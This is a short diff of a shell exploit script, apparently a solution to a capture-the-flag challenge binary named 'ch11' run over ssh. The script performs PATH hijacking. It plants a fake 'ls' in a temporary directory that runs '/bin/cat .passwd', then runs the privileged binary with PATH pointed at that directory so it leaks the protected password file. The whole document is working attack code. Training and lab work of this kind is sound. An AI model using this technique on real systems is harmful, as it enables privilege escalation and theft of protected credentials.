@@ -1,11 +1,12 @@
 # ssh ... < commands.sh
 
-mkdir -p /tmp/h4x
+d=$(mktemp -d)
+chmod g+x $d
 
-cat << EOF > /tmp/h4x/ls
+cat << EOF > $d/ls
 #!/bin/bash
 /bin/cat .passwd
 EOF
-chmod +x /tmp/h4x/ls
+chmod +x $d/ls
 
-PATH=/tmp/h4x ./ch11
+PATH=$d ./ch11
